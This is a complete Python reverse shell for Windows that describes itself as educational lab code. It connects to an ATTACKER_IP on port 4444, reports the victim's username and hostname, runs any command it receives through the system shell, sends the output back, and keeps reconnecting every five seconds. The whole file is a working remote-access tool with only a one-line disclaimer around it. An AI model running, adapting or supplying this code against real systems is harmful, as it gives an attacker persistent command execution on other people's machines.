#!/usr/bin/env python3
"""
Simple Reverse Shell for Windows Testing
Educational purposes only - Use in controlled lab environment
"""

import socket
import subprocess
import os
import sys
import time

# Configuration - Change these values
ATTACKER_IP = "192.168.1.10"  # Replace with your Kali IP
ATTACKER_PORT = 4444

def create_connection():
    """Establish connection to attacker machine"""
    try:
        # Create socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        return s
    except Exception as e:
        return None

def execute_command(command):
    """Execute system command and return output"""
    try:
        if command.lower() == 'exit':
            return 'exit'
        
        # Execute command
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        
        # Combine stdout and stderr
        output = result.stdout
        if result.stderr:
            output += f"\nError: {result.stderr}"
        
        return output if output else "Command executed (no output)"
    
    except Exception as e:
        return f"Error executing command: {str(e)}"

def main():
    """Main reverse shell function"""
    while True:
        try:
            # Try to connect to attacker
            connection = create_connection()
            
            if connection:
                # Send initial connection message
                hostname = os.getenv('COMPUTERNAME', 'Unknown')
                username = os.getenv('USERNAME', 'Unknown')
                initial_msg = f"[+] Connection established from {username}@{hostname}\n"
                connection.send(initial_msg.encode())
                
                # Main command loop
                while True:
                    try:
                        # Receive command
                        command = connection.recv(1024).decode().strip()
                        
                        if not command or command.lower() == 'exit':
                            break
                        
                        # Execute command
                        output = execute_command(command)
                        
                        if output == 'exit':
                            break
                        
                        # Send result back
                        connection.send(f"{output}\n".encode())
                    
                    except Exception:
                        break
                
                connection.close()
            
            # Wait before trying to reconnect
            time.sleep(5)
            
        except KeyboardInterrupt:
            break
        except Exception:
            time.sleep(5)
            continue

if __name__ == "__main__":
    main()